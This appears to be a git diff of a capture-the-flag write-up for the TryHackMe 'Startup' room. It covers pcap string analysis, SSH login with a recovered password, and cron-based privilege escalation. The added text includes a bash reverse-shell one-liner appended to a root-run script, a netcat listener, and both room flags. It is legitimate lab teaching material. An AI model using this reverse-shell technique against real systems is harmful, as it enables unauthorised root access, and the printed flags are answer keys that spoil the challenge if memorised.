@@ -176,7 +176,7 @@ We quickly try to find user.txt flag using find command:\
 
 
 ```bash
-find / -iname 'user.txt' 2>/dev/null
+find / -type f -iname user.txt 2>/dev/null
 ```
 
 but we don't find anything! Then we need to explore files or escalate privileges
@@ -195,65 +195,110 @@ strings susp.pcap
 
 <figure><img src=".gitbook/assets/Schermata del 2023-07-30 11-33-24.png" alt=""><figcaption></figcaption></figure>
 
-
-
-
-
-
-
-
+<figure><img src=".gitbook/assets/Schermata del 2023-07-30 11-37-44 (1).png" alt=""><figcaption></figcaption></figure>
 
 We see this psw: c4ntg3t3n0ughsp1c3 we can try to use it!
 
-
-
-
-
-
-
-
-
-Starting to root folder (C:\\) we can find quickly flags, using where command in recusive mode (/r):
-
-```
-where /r C:\ user.txt
-C:\Users\babis\Desktop\user.txt
+```bash
+ssh lennie@startup.thm
 ```
 
-and read user.txt flag using type command (equivalent to cat on \*nix):
+```bash
+lennie@startup.thm's password: 
+Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.4.0-190-generic x86_64)
 
-```
-type C:\Users\babis\Desktop\user.txt
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+44 packages can be updated.
+30 updates are security updates.
+
+
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+$ ls
+Documents  scripts  user.txt
+$ cat user.txt
 ```
 
 <details>
 
 <summary>🚩 Flag 1 (user.txt)</summary>
 
-
+THM{03ce3d619b80ccbfb3b7fc81e46c0e79}
 
 </details>
 
 ### Task 4 - What are the contents of root.txt?
 
-\
-
-
-After that, we do the same thing for root.txt flag
+We can continue to explore files:
 
 ```bash
-where /r C:\ root.txt
-C:\Users\Administrator\Desktop\root.txt
+ls -lah *
+    -rw-r--r-- 1 lennie lennie   38 Nov 12  2020 user.txt
+    
+    Documents:
+    total 20K
+    drwxr-xr-x 2 lennie lennie 4.0K Nov 12  2020 .
+    drwx------ 5 lennie lennie 4.0K May 15 13:37 ..
+    -rw-r--r-- 1 root   root    139 Nov 12  2020 concern.txt
+    -rw-r--r-- 1 root   root     47 Nov 12  2020 list.txt
+    -rw-r--r-- 1 root   root    101 Nov 12  2020 note.txt
+    
+    scripts:
+    total 16K
+    drwxr-xr-x 2 root   root   4.0K Nov 12  2020 .
+    drwx------ 5 lennie lennie 4.0K May 15 13:37 ..
+    -rwxr-xr-x 1 root   root     77 Nov 12  2020 planner.sh
+    -rw-r--r-- 1 root   root      1 May 15 13:38 startup_list.txt
+
+cat scripts/*
+cat Documents/*
+cat /etc/print.sh
+ls -lah /etc/print.sh
+	-rwx------ 1 lennie lennie 25 Nov 12  2020 /etc/print.sh
 ```
 
+We see that planner.sh will be run as root (with a cron job), and use /etc/print.sh with lennie permission, we can modify it inserting a reverse shell as payload:
+
 ```bash
-type C:\Users\Administrator\Desktop\root.txt
+echo "/bin/bash -i >& /dev/tcp/10.9.80.228/666 0>&1" >> /etc/print.sh                                                     
 ```
+
+Then, we run on our kali machine netcat on the same port (666):
+
+```bash
+nc -nvlp 666
+```
+
+and wait root that will run the planner.sh script once a minute.
+
+<figure><img src=".gitbook/assets/Schermata del 2023-07-30 12-37-21.png" alt=""><figcaption></figcaption></figure>
+
+Well done! We find root flag:
+
+```bash
+ls
+cat root.txt
+```
+
+<div align="left">
+
+<figure><img src=".gitbook/assets/Schermata del 2023-07-30 12-38-55.png" alt=""><figcaption></figcaption></figure>
+
+</div>
 
 <details>
 
 <summary>🚩 Flag 2 (root.txt)</summary>
 
-
+THM{f963aaa6a430f210222158ae15c3d76d}
 
 </details>
